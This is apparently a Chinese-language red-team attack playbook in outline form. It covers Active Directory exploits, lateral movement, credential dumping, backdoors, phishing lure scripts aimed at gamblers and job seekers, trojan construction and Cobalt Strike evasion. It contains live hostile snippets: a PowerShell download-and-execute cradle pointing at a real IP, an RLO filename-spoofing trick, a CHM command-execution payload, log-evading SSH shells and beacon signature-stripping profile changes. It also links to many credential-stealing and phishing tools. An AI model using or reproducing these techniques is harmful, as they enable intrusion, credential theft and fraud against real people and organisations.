  - KDC验证缺少PAC的TGT成功后，再验证不在TGT中 的PAC的合法性。如果2个均验证成功，KDC把PAC中的User SID、Group SID取出来，重新使用进行签名，签名算法和密钥与设置include-pac标志位为TRUE时一模一样。将将新产生的PAC加入到解密后的TGT中，再重新加密制作全新的TGT发送给Client
    - 因为请求的服务是krbtgt，所以返回的TGS票据是可以当做TGT
- deploy
#### CVE-2020-1472

- MS-NRPC
  - AES-CFB8
    - 在明文前面添加 16 字节初始化向量 (IV) 来加密明文的每个字节，然后将 AES 应用于 IV 和明文的前 16 个字节，获取 AES 输出的第一个字节，并将其与下一个明文字节进行异或
    - 对于 256 个密钥中的 1 个，将 AESCFB8 加密应用于全零明文将产生全零密文，从而能够绕过登录
    - 使用 NetrServerPasswordSet2 方法，可以为客户端创建一个新密码，该密码可以使用 AES-CFB8 使用会话密钥进行加密。 Netlogon明文密码由516个字节组成，后四位表示密码长度。通过提供 516 个零，该密码将被解密为 516 个零或空密码
      - server_auth = nrpc.hNetrServerAuthenticate3(      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,      target_computer + '\x00', ciphertext, flags    )
#### CVE-2021-1675/CVE-2021-34527（PrintNightMare）

- Print Spooler 服务
  - RpcAddPrinterDriver
    - 允许远程打印和驱动程序安装。该函数旨在为具有 Windows 特权 SeLoadDriverPrivilege 的用户提供向远程打印池添加驱动程序的能力。这个权限通常保留给内置 Administrators 组和可能有合法需要在远程终端用户机器上安装打印机驱动程序的 Print Operators 组的用户。
      - 允许任何经过身份验证的用户在没有上述特权的情况下向 Windows 系统添加打印驱动程序，从而使攻击者能够在受影响的系统上完全远程执行代码，权限为SYSTEM
#### CVE-2021-42287&CVE-2021-42278（noPac）

- CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。
- CVE-2021-42287，创建一个与DC机器账户名称相同的机器账户(不以$结尾)，使用该账户请求一个TGT后，修改账户名，然后通过S4U2Self申请TGS Ticket，然后DC进行在TGS_REP阶段加密TGS Ticket时，无法找到该账户利用机器账户hash加密，DC便使用自己的hash加密TGS Ticket，提供一个属于该账户的PAC，我们便可得到一个高权限的ST
- MS-DS-Machine-Account-Quota=0
  - **需要对⼀个账⼾有写权限**
    - GenericAll
    - 对某些**机器、或是用户**有写权限的组
    - 加域账号
#### 通过域中继漏洞提权或adcs漏洞等

- CVE-2022-26923
  - DNShostname
- NTLM中继
  - Responder
  - Inveigh
  - multirelayx.py
  - PrinterBug
  - PeitiPotam
  - DFSCoerce
  - ShadowCoerce
  - PrivExchange
  - [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)
#### 通过Distributed-COM-Users或者Performance-Log-Users权限获得域控权限

- [https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/)
#### 获取到Azure AD连接同步账户

- DC SYNC
#### 分析组策略

- [https://github.com/synacktiv/gpoParser/tree/main](https://github.com/synacktiv/gpoParser/tree/main)
#### [https://github.com/evilashz/PIGADVulnScanner](https://github.com/evilashz/PIGADVulnScanner)

### 服务器提权

#### Potato 系列提权原理讲解与免杀

- SeImpersonate身份验证后模拟客户端
  - Windows 2000 SP4
  - 服务控制管理器启动的服务
  - 由 COM 基础架构启动并配置为在特定账户下运行的 COM 服务器
  - 设备本地管理员组的成员
  - 设备本地服务帐户
  - Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment
    - gpedit
  - 这玩意是给线程的
- com 基础
  - 每个 COM 接口都必须直接或间接继承自名为 IUnknown 的接口。 此接口提供一些所有 COM 对象都必须支持的基线功能
    - IUnknown
      - QueryInterface
        - dynamic_cast
        - hr = pFileOpen->QueryInterface(IID_IFileDialogCustomize,reinterpret_cast<void**>(&pCustom));
      - AddRef
        - 对象引用计数
      - Release
  - com 事件
    - event_source
    - event_receiver
  - BSTR
    - 在分配时会在字符串前面额外存储一个 4 字节的长度字段，记录字符串的字节数（不包括结尾的空字符 \0）
  - 内存
    - CoTaskMemAlloc
    - CoTaskMemFree
  - __uuidof
  - IID_PPV_ARGS
    - pFileOpen->QueryInterface(IID_PPV_ARGS(&pCustom))
  - SafeRelease
  - CComPtr
    - 不显式调用 Release
      - pFileOpen.CoCreateInstance(__uuidof(FileOpenDialog));
- Rotten Potato
  - [https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp](https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp)
  - SSPI
    - SSPI 全称 Security Support Provider Interface（安全支持提供者接口），是 Windows 操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API
    - SSP
      - Microsoft 安全支持提供程序接口 (SSPI) 是 Windows 身份验证的基础。 要求身份验证的应用程序和基础结构服务会使用 SSPI ，使用的协议就是以下 SSP 安全协议
      - NTLM SSP
        - Challenge/Response 验证机制
          - 客户端利用 NTLM SSP 生成 NTLM_NEGOTIATE 消息 （被称为 TYPE 1 消息），并将 TYPE 1 消息发送给服务端。
          - 服务端接收到客户端发送过来的 TYPE 1 消息，传入 NTLM SSP，得到 NTLM_CHALLENGE 消息（被称为 TYPE 2消息），并将此消息发回客户端。此消息中包含了一个由服务端生成的随机值，此随机值被称为 challenge。
          - 客户端收到服务端返回的 TYPE 2 消息，并取出其中的随机值 challenge。客户端将密码 （123） 转换为 LM HASH 与 NT HASH，同时利用计算出来的 LM HASH 与/或 NT HASH 对 challenge 进行一些计算。
          - 服务端收到 TYPE 3 消息后，将会重复第 3 步客户端的操作，也计算出来一个 hash。然后将自己计算出来的 hash 与客户端发送过来的 TYPE 3 消息中的 hash 进行对比，如果一样，则客户端验证成功。不一样，则客户端验证失败
      - Kerberos
        - 基于 ticket 的身份验证机制
  - CoGetInstanceFromIStorage
    - [https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage](https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage)
  - [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
#### 内核漏洞提权

### 域内横向移动方法及工具免杀

#### 利用 RPC 域内信息收集与横向移动

- 横向
  - [https://github.com/XiaoliChan/wmiexec-Pro](https://github.com/XiaoliChan/wmiexec-Pro)
    - Win32_ScheduledJob
  - [https://github.com/JDArmy/NO445-lateral-movement](https://github.com/JDArmy/NO445-lateral-movement)
    - Win32_Process
  - [https://github.com/rootclay/WMIHACKER](https://github.com/rootclay/WMIHACKER)
  - [https://github.com/XiaoliChan/wmiexec-RegOut](https://github.com/XiaoliChan/wmiexec-RegOut)
  - [https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)
    - hRChangeServiceConfigW
  - [https://github.com/airzero24/WMIReg](https://github.com/airzero24/WMIReg)
    - StdRegProv
  - [https://github.com/lexfo/rpc2socks](https://github.com/lexfo/rpc2socks)
    - socks
  - [https://github.com/Marshall-Hallenbeck/ms_scmr](https://github.com/Marshall-Hallenbeck/ms_scmr)
    - 上传文件等
  - [https://github.com/zyn3rgy/smbtakeover](https://github.com/zyn3rgy/smbtakeover)
    - 解除 445/tcp 绑定
  - [https://github.com/WKL-Sec/dcomhijack](https://github.com/WKL-Sec/dcomhijack)
    - dcom相关dll劫持
  - [https://github.com/zcgonvh/TaskSchedulerMisc](https://github.com/zcgonvh/TaskSchedulerMisc)
    - MS-TSCH 计划任务
- 信息收集
  - [https://github.com/JDArmy/RPCSCAN](https://github.com/JDArmy/RPCSCAN)
    - ms-epmap
  - [https://github.com/StarfireLab/EFSRPCrpc](https://github.com/StarfireLab/EFSRPCrpc)
    - EFSRPC-ping
- rpc
  - [https://github.com/sogeti-esec-lab/RPCForge](https://github.com/sogeti-esec-lab/RPCForge)
    - fuzz
  - [https://github.com/hfiref0x/WinObjEx64](https://github.com/hfiref0x/WinObjEx64)
    - windows对象查看器
  - [https://github.com/tothi/serviceDetector](https://github.com/tothi/serviceDetector)
    - 连接445通过ms-lsat查询已安装的服务
  - [https://github.com/cyberark/RPCMon](https://github.com/cyberark/RPCMon)
    - 监控rpc
  - [https://github.com/zodiacon/WFPExplorer](https://github.com/zodiacon/WFPExplorer)
    - Windows 过滤平台对象
  - [https://github.com/CICADA8-Research/COMThanasia](https://github.com/CICADA8-Research/COMThanasia)
    - com对象分析工具
#### 域内凭证及口令收集

- [https://github.com/ly4k/PassTheChallenge](https://github.com/ly4k/PassTheChallenge)
  - Credential Guard 凭证保护服务
- [https://github.com/ly4k/Pypykatz](https://github.com/ly4k/Pypykatz)
  - python mimikatz
- [https://github.com/praetorian-inc/ADFSRelay](https://github.com/praetorian-inc/ADFSRelay)
  - adfs认证relay
- [https://github.com/med0x2e/NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self)
  - web relay
- [https://github.com/deepinstinct/Lsass-Shtinkering](https://github.com/deepinstinct/Lsass-Shtinkering)
  - Windows 错误报告服务
- [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
  - 资源约束委派
- [https://github.com/wjlab/Darksteel](https://github.com/wjlab/Darksteel)
  - 域内自动化信息搜集
- [https://github.com/lele8/SharpUserIP](https://github.com/lele8/SharpUserIP)
  - 在域控或远程提取登录日志，快速获取域用户对应的 IP 地址
- [https://github.com/aleenzz/ADExplorerX](https://github.com/aleenzz/ADExplorerX)
  - ad浏览器
- [https://github.com/outflanknl/Dumpert](https://github.com/outflanknl/Dumpert)
  - System Calls
    - old
- [https://github.com/zblurx/certsync](https://github.com/zblurx/certsync)
  - 证书利用
- [https://github.com/battleoverflow/lsass-dump](https://github.com/battleoverflow/lsass-dump)
  - 导出的简单演示
- [https://github.com/0x727/UserRegEnum_0x727](https://github.com/0x727/UserRegEnum_0x727)
  - 域内普通域用户权限查找域内所有计算机上登录的用户
- [https://github.com/Avienma/DumpHash](https://github.com/Avienma/DumpHash)
  - 干净的hash导出但是要求权限很高
- [https://github.com/GamehunterKaan/Plog](https://github.com/GamehunterKaan/Plog)
  - mimikatz导出密码模块
- [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
  - 只读dpapi
- [https://github.com/mdsecactivebreach/DragonCastle](https://github.com/mdsecactivebreach/DragonCastle)
  - dll劫持读hash
- [https://github.com/expl0itabl3/EZDump](https://github.com/expl0itabl3/EZDump)
  - 简单导出c#
- [https://github.com/nettitude/ETWHash](https://github.com/nettitude/ETWHash)
  - 利用etw事件读取hash
- [https://github.com/4ndr34z/ntlmthief](https://github.com/4ndr34z/ntlmthief)
  - 利用sspi读取hash
- [https://github.com/gabriellandau/PPLFault](https://github.com/gabriellandau/PPLFault)
  - 攻击ppl进程保护技术读取hash
- [https://github.com/grimlockx/ADCSKiller](https://github.com/grimlockx/ADCSKiller)
  - adcs利用工具
- [https://github.com/OmriBaso/RToolZ](https://github.com/OmriBaso/RToolZ)
  - 利用 ProcExp152.sys 驱动程序转储 PPL Lsass
- [https://github.com/BeichenDream/SharpToken](https://github.com/BeichenDream/SharpToken)
  - 找到系统中所有进程泄露的 Token
- [https://github.com/S12cybersecurity/RDPCredentialStealer](https://github.com/S12cybersecurity/RDPCredentialStealer)
  - Detours API Hooking读rdp登录凭证
- [https://github.com/Heart-Sky/ListRDPConnections](https://github.com/Heart-Sky/ListRDPConnections)
  - 列出所有rdp连接记录
- [https://github.com/0neAtSec/SharpDomainInfo](https://github.com/0neAtSec/SharpDomainInfo)
  - 自动化信息收集
- [https://github.com/Tw1sm/spraycharles](https://github.com/Tw1sm/spraycharles)
  - 慢速密码喷射
- [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)
- [https://github.com/grayhatkiller/SharpExShell](https://github.com/grayhatkiller/SharpExShell)
- [https://github.com/djackreuter/proc_noprocdump](https://github.com/djackreuter/proc_noprocdump)
- [https://github.com/mtth-bfft/adeleg](https://github.com/mtth-bfft/adeleg)
  - 查所有委派
- [https://github.com/ricardojoserf/NativeDump](https://github.com/ricardojoserf/NativeDump)
- [https://github.com/MzHmO/LeakedWallpaper](https://github.com/MzHmO/LeakedWallpaper)
  - 从session提取hash
- [https://github.com/Offensive-Panda/LsassReflectDumping](https://github.com/Offensive-Panda/LsassReflectDumping)
- [https://github.com/Offensive-Panda/ShadowDumper](https://github.com/Offensive-Panda/ShadowDumper)
  - 多种方式导出hash
### 权限维持方法

#### windows 后门

- 自启动后门
- [https://github.com/mdsecactivebreach/WMIPersistence](https://github.com/mdsecactivebreach/WMIPersistence)
- [https://github.com/netero1010/GhostTask](https://github.com/netero1010/GhostTask)
#### linux 后门

- PAM 后门
- tsh 后门
#### 修改源码插入后门

### 内网核心设备攻防及信息收集思路

#### nas

#### 邮服

#### 堡垒机

#### vcenter

#### vdi 云桌面

#### vpn

### 非域内网渗透

#### 怎么进去的

- （web打点）linux getshell
  - 重新爬取web源码找敏感信息
    - secretkey|硬编码
    - url
    - 拖回来审代码
      - 找更多漏洞维持权限
    - 找web可访达目录
      - 放马
  - 找本机关键信息
    - host
    - history
    - .....
    - .viminfo
    - ssh私钥
  - PAM抓ssh密码
    - so文件本地搭环境自己编译
  - 扫内存
    - [https://github.com/liamg/dismember](https://github.com/liamg/dismember)
  - [https://platypus-reverse-shell.vercel.app](https://platypus-reverse-shell.vercel.app/)
  - 找目录
    - >find / -writable -type d 2>/dev/null      # 可写目录
>find / -perm -222 -type d 2>/dev/null     # 可写目录 
>find / -perm -o w -type d 2>/dev/null     # 可写目录
>find / -perm -o x -type d 2>/dev/null     # 可执行目录
>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # 可写可执行目录
      - attrib +s +h +r 1.txt 修改文件时间
  - 查iptable
  - ssh -T root@192.168.1.1 /usr/bin/bash -i
    - 幽灵登陆
      - 不分配伪终端无日志有连接
  - grep -rn "jdbc:oracle" /opt/SuperMap/TongWeb7.0.4.1/domains/tw_80/
    - 搜索包含特定字符串内容的文件
- vpn
  - 漏洞获取shell
  - 漏洞泄露用户名密码
    - fortinet
  - 漏洞泄露cookie
    - 有些云桌面
      - 勒索
  - 流量清晰可见、快速找跳板机
- sso
  - dns劫持绕过二次验证
  - 注意对方设备登录提醒
  - oauth漏洞
- 单挂一台windows
  - 注册表信息收集
    - [https://github.com/SpecterOps/Nemesis](https://github.com/SpecterOps/Nemesis)
  - 找敏感文件
    - [https://github.com/c1y2m3/FileSearch](https://github.com/c1y2m3/FileSearch)
    - [https://github.com/Naturehi666/searchall](https://github.com/Naturehi666/searchall)
    - [https://github.com/mandiant/msi-search](https://github.com/mandiant/msi-search)
    - [https://github.com/AabyssZG/FindEverything](https://github.com/AabyssZG/FindEverything)
    - 指定磁盘下搜索特定名称的文件
      - dir D:\ /S /B | find "orange1.jsp"
      - /S          显示指定目录和所有子目录中的文件。
      - /B          使用空格式(没有标题信息或摘要)。
    - 全盘搜索特定名称的文件
      - cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2>nul | findstr "ToDesk_Lite.exe""
  - rdp劫持
    - [https://github.com/S12cybersecurity/RDPCredentialStealer](https://github.com/S12cybersecurity/RDPCredentialStealer)
    - [https://github.com/GoSecure/pyrdp](https://github.com/GoSecure/pyrdp)
    - [https://github.com/0x09AL/RdpThief](https://github.com/0x09AL/RdpThief)
  - 查看历史记录
    - cmd下：doskey /history
    - powershell下：Get-History
  - 远控开发
    - 执行命令
    - 列目录
    - 云oss+git
- onedrive\ossutil\github lfs
- [https://gofile.io/](https://gofile.io/)、[https://send.cm/](https://send.cm/)、[https://krakenfiles.com/](https://krakenfiles.com/)、[https://download.ru/](https://download.ru/)
#### 横向

- web端口
  - 常见web端口
  - 服务器信息收集到的web端口
    - log
    - 连接
- 其他端口漏洞
  - [https://github.com/AabyssZG/Docker-TCP-Scan](https://github.com/AabyssZG/Docker-TCP-Scan)
  - 做字典密码喷射
    - 连接工具|elastic....
      - [https://github.com/team-ide/teamide](https://github.com/team-ide/teamide)
  - 数据库getshell
  - ...
  - Kubernetes:8443端口
- 关键网络设施|网关|dns|设备弱口令
  - dns劫持
    - 甲方蓝军
    - 国际酒店
    - Ettercap|http
  - switch
    - 弱口令
      - cirtx
    - [https://github.com/Blootus/CVE-2024-20399-Cisco-RCE](https://github.com/Blootus/CVE-2024-20399-Cisco-RCE)
- 爆破域名
#### 找域

- [https://github.com/sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- resolve.conf
  - dns
- /etc/krb5.conf
- smb.conf
- cifs挂载
- 找nas
- 找ad验证web服务
- 源码+服务器配置文件
- 找vdi
  - 常见的与信息收集命令，涉及到请求与空服务器的都不要用
- 找wsus
- 找sccm
- 找edr管控终端
- 查看网络连接
  - 139
    - 双网卡
  - 445
  - 389
  - 636
- gitlab等...
#### tv|向日葵|

### 服务器及个人 pc 信息收集工具及方法

#### bypass edr 获取 hash

#### 主机管理工具信息收集

- shell管理工具
  - finalshell
    - [https://github.com/MaskCyberSecurityTeam/FinalShellGetPass](https://github.com/MaskCyberSecurityTeam/FinalShellGetPass)
  - xshell
- 邮件
  - Foxmail
- 浏览器
  - chrome
    - [https://github.com/Meckazin/ChromeKatz](https://github.com/Meckazin/ChromeKatz)
    - unlock
    - 影子文件
      - [https://github.com/StarfireLab/BrowserPivot](https://github.com/StarfireLab/BrowserPivot)
    - DPAPI 秘钥
    - [https://github.com/magisterquis/chromecookiestealer](https://github.com/magisterquis/chromecookiestealer)
  - [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
- telegram
  - [https://github.com/atilaromero/telegram-desktop-decrypt](https://github.com/atilaromero/telegram-desktop-decrypt)
- vpn连接信息解密
  - [https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e](https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e)
- todesk、向日葵、vnc
  - [https://github.com/flydyyg/readTdose-xiangrikui](https://github.com/flydyyg/readTdose-xiangrikui)
  - [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
- 密码管理工具
  - KeePass
    - [https://github.com/vdohney/keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)
- [https://github.com/lemonlove7/passwd_decrypt_Tools](https://github.com/lemonlove7/passwd_decrypt_Tools)
- [https://github.com/qwqdanchun/Pillager](https://github.com/qwqdanchun/Pillager)
- [https://github.com/V1V1/SharpScribbles](https://github.com/V1V1/SharpScribbles)
- [https://github.com/Pizz33/GoThief](https://github.com/Pizz33/GoThief)
- [https://github.com/can-kat/cstealer](https://github.com/can-kat/cstealer)
#### pyinstaller.exe -F BBScan.py --clean --add-data rules;rules

- 主机不出网工具需要打包成exe
### 进入内网第一步

#### 快速本机信息收集

#### 内网找web服务（安全设备）

#### c2白流量

## **钓鱼 **

### 话术

#### 赌客

- 系统故障
  - 无法开户
  - 无法充值
  - 无法提现
- 开启代理
  - 无法返水
- 海外赌客
  - 无法添加银行卡
#### 应聘

- 发送简历
- 约会议室
- 面试软件升级
#### 合作

- 公会会长
- 赌客资料一手
- 四方支付
  - 成功率低|线下
- 包网服务
  - 提供案例
  - 提供源码
  - 提供更新
#### [http://gongwenguan.com/](http://gongwenguan.com/)

### 实战水坑搭建

#### 域名购买/fish域名的选择

- [www.Expireddomains.com](http://www.expireddomains.com/)
  - typo
  - unicode
    - [https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8](https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8)
  - [https://github.com/evilsocket/ditto](https://github.com/evilsocket/ditto)
- spf
  - [https://github.com/SummerSec/spf](https://github.com/SummerSec/spf)
  - [https://github.com/chenjj/espoofer.git](https://github.com/chenjj/espoofer.git)
  - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
  - [https://emkei.cz/](https://emkei.cz/)
  - 子机构|自建邮服、域名
  - SendGrid
  - mailgun
  - [https://github.com/r00tSe7en/Mail-Probe](https://github.com/r00tSe7en/Mail-Probe)
#### 水坑页面制作

- chrome钓鱼
  - [https://www.google.com/intl/zh-CN/chrome/](https://www.google.com/intl/zh-CN/chrome/)
- flash钓鱼
  - [https://github.com/r00tSe7en/Flash-Pop](https://github.com/r00tSe7en/Flash-Pop)
  - [https://github.com/crow821/FakeFlash](https://github.com/crow821/FakeFlash)
- 客服系统升级提醒
  - 需存在xss
    - 自建客服平台
      - 文件内容解析
        - markdown
- 钓鱼模板
  - [https://github.com/Threezh1/SiteCopy.git](https://github.com/Threezh1/SiteCopy.git)
  - [https://smalltool.github.io/](https://smalltool.github.io/)
  - [https://github.com/htr-tech/zphisher](https://github.com/htr-tech/zphisher)
  - [https://github.com/JoelGMSec/EvilnoVNC](https://github.com/JoelGMSec/EvilnoVNC)
  - evilginx
- fake login
  - [https://github.com/bitsadmin/fakelogonscreen](https://github.com/bitsadmin/fakelogonscreen)
  - [https://github.com/Pickfordmatt/SharpLocker](https://github.com/Pickfordmatt/SharpLocker)
  - [https://github.com/Dviros/CredsLeaker](https://github.com/Dviros/CredsLeaker)
  - [https://github.com/An0nUD4Y/Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets)
  - [https://github.com/klezVirus/evilginx-collection](https://github.com/klezVirus/evilginx-collection)
  - [https://github.com/eversinc33/Web-Windows-Login-Phishing](https://github.com/eversinc33/Web-Windows-Login-Phishing)
#### 后端环境搭建及反沙箱

- otp
  - [https://github.com/asnzodiac/asnphishing](https://github.com/asnzodiac/asnphishing)
- xss自己搭平台不然你的cookie都是别人的
- [https://goblin.xiecat.fun/guide/#flash-demo](https://goblin.xiecat.fun/guide/#flash-demo)
  - flash,自己改
- [https://github.com/highmeh/lure](https://github.com/highmeh/lure)
  - 收集email|配合emailall
- [https://github.com/doyensec/Session-Hijacking-Visual-Exploitation](https://github.com/doyensec/Session-Hijacking-Visual-Exploitation)
- [https://github.com/fin3ss3g0d/evilgophish](https://github.com/fin3ss3g0d/evilgophish)
### 马子制作方式

#### winrar

- 自解压
- [https://github.com/b1tg/CVE-2023-38831-winrar-exploit](https://github.com/b1tg/CVE-2023-38831-winrar-exploit)
#### RLO文件名倒置

- 文件打标
- exe->scr|pif
#### link

- [https://github.com/dievus/lnkbomb](https://github.com/dievus/lnkbomb)
- [https://github.com/Yihsiwei/Lnk-Trojan](https://github.com/Yihsiwei/Lnk-Trojan)
- [https://github.com/nickvourd/Rocabella](https://github.com/nickvourd/Rocabella)
- [https://github.com/Pizz33/FTPlnk_phishing](https://github.com/Pizz33/FTPlnk_phishing)
#### import os  os.rename('1.exe', '1\u202egnp.exe')

#### [https://github.com/inspiringz/GoFileBinder](https://github.com/inspiringz/GoFileBinder)

#### CHM

- easychm
  - <!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>command exec <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"> <PARAM name="Button" value="Bitmap::shortcut"> <PARAM name="Item1" value=',cmd.exe,/c calc.exe'> <PARAM name="Item2" value="273,1,1"></OBJECT><SCRIPT>x.Click();</SCRIPT></body></html>
#### ico替换

- [https://jarlpenguin.github.io/BeCyIconGrabberPortable/](https://jarlpenguin.github.io/BeCyIconGrabberPortable/)
- [https://www.angusj.com/resourcehacker/](https://www.angusj.com/resourcehacker/)
- [https://www.nirsoft.net/utils/iconsext.html](https://www.nirsoft.net/utils/iconsext.html)
- [https://www.lanzoux.com/iBvsMhajljg](https://www.lanzoux.com/iBvsMhajljg)
#### [https://github.com/tokyoneon/B2E](https://github.com/tokyoneon/B2E)

- notepad chcp 1200 & powershell  -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://106.53.97.7:82/a')"
#### 超长文件名

#### [https://cli.im/tools](https://cli.im/tools)

#### [https://github.com/dr0op/CrossNet-Beta](https://github.com/dr0op/CrossNet-Beta)

- 看下就好学习思路
#### [https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)

#### [https://github.com/TheCyb3rAlpha/BobTheSmuggler](https://github.com/TheCyb3rAlpha/BobTheSmuggler)

## **远控工具开发 **

### CobaltStrike 实战去特征免杀

#### 插件开发

- [https://github.com/lintstar/LSTAR](https://github.com/lintstar/LSTAR)
- [https://github.com/REDMED-X/OperatorsKit](https://github.com/REDMED-X/OperatorsKit)
- [https://github.com/lintstar/CS-AutoPostChain](https://github.com/lintstar/CS-AutoPostChain)
- [https://github.com/qigpig/Ghosting-BOF](https://github.com/qigpig/Ghosting-BOF)
- [https://github.com/CodeXTF2/WindowSpy](https://github.com/CodeXTF2/WindowSpy)
- [https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file](https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file)
- [https://github.com/mertdas/PrivKit](https://github.com/mertdas/PrivKit)
- [https://github.com/rasta-mouse/PPEnum](https://github.com/rasta-mouse/PPEnum)
- [https://github.com/m3rcer/Chisel-Strike](https://github.com/m3rcer/Chisel-Strike)
- [https://github.com/tijme/cmstplua-uac-bypass](https://github.com/tijme/cmstplua-uac-bypass)
- [https://github.com/yutianqaq/CSx4Ldr](https://github.com/yutianqaq/CSx4Ldr)
- cna or bof xxx
  - beacon = client.beacons.first ;beacon.execute_bof('example')
    - beacon.inline_execute('<Beacon ID>', '<CBOF C Code Snippet>')
  - [https://github.com/dtmsecurity/bof_helper](https://github.com/dtmsecurity/bof_helper)
  - [https://github.com/securifybv/Visual-Studio-BOF-template](https://github.com/securifybv/Visual-Studio-BOF-template)
- [https://github.com/kyleavery/AceLdr](https://github.com/kyleavery/AceLdr)
- [https://github.com/Cobalt-Strike/bof-vs](https://github.com/Cobalt-Strike/bof-vs)
- [https://github.com/fortra/No-Consolation](https://github.com/fortra/No-Consolation)
- [https://github.com/ScriptIdiot/BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit)
- [https://github.com/qwqdanchun/ScreenShot-BOF](https://github.com/qwqdanchun/ScreenShot-BOF)
- [https://github.com/rasta-mouse/SCMUACBypass](https://github.com/rasta-mouse/SCMUACBypass)
- [https://github.com/9bie/Slacker](https://github.com/9bie/Slacker)
- [https://github.com/ewby/Mockingjay_BOF](https://github.com/ewby/Mockingjay_BOF)
- [https://github.com/baiyies/ScreenshotBOFPlus](https://github.com/baiyies/ScreenshotBOFPlus)
- [https://github.com/Octoberfest7/DropSpawn_BOF](https://github.com/Octoberfest7/DropSpawn_BOF)
- [https://github.com/WKL-Sec/HiddenDesktop](https://github.com/WKL-Sec/HiddenDesktop)
- [https://github.com/boku7/whereami](https://github.com/boku7/whereami)
- [https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer](https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer)
#### 服务器设置

- 禁ping
  - /etc/sysctl.conf 中增加一行
  - net.ipv4.icmp_echo_ignore_all=1
- cdn
  - 免费cf账号
#### CS修改

- [https://github.com/CodeXTF2/Burp2Malleable](https://github.com/CodeXTF2/Burp2Malleable)
- [https://github.com/RedSiege/C2concealer](https://github.com/RedSiege/C2concealer)
- [https://github.com/RedSiege/GraphStrike](https://github.com/RedSiege/GraphStrike)
- [https://github.com/D00Movenok/goMalleable](https://github.com/D00Movenok/goMalleable)
- [https://github.com/byt3bl33d3r/pyMalleableC2](https://github.com/byt3bl33d3r/pyMalleableC2)
- [https://github.com/Peithon/JustC2file](https://github.com/Peithon/JustC2file)
#### beacon

- [https://github.com/Z3ratu1/geacon_plus](https://github.com/Z3ratu1/geacon_plus)
- [https://github.com/b1tg/cobaltstrike-beacon-rust](https://github.com/b1tg/cobaltstrike-beacon-rust)
- [https://github.com/tijme/amd-ryzen-master-driver-v17-exploit](https://github.com/tijme/amd-ryzen-master-driver-v17-exploit)
- [https://github.com/NoOne-hub/Beacon.dll](https://github.com/NoOne-hub/Beacon.dll)
  - 简单逆向
- [https://github.com/kyxiaxiang/Beacon_Source](https://github.com/kyxiaxiang/Beacon_Source)
- 修改特征
  - private static byte[] OriginKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};private static byte[] CustomizeKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};
    - 修改key
  - 修改profile
    - transform-x64 {    strrep "beacon.x64.dll" "";}
      - 修改关键字
    - set magic_mz_x86 "1234"; set magic_mz_x64 "5678";
      - 修改mz头
    - set magic_pe "BB";
      - 修改pe头
    - set cleanup "true";
      - 对原始Beacon DLL进行清除
    - set obfuscate "true";
      - 除掉了dll头部
    - set userwx "false";
      - 不必给可写
    - [https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit](https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit)
      - void my_mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {   char key[] = "cf81d743beef8422";   size_t key_lenght = sizeof(key) - 1;   while (a < b) {      *(parms->beacon_ptr + a) ^= key[a % key_lenght];      a++;   }}
        - 修改sleepmask特征
      - 修改MSSE pipe特征
  - beaconeye
    - 6A 00
### 流量转发工具二次开发

#### 方法

- 修改工具ua头
